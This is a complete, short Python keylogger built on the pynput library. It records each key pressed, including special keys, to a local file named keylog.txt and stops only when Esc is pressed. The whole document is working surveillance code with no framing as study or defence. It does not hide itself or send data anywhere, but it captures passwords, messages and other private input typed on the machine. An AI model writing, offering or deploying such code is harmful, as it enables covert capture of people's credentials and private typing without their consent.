from pynput import keyboard
import logging

# Set up logging
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        logging.info(f'{key}')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    # Start listening for keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
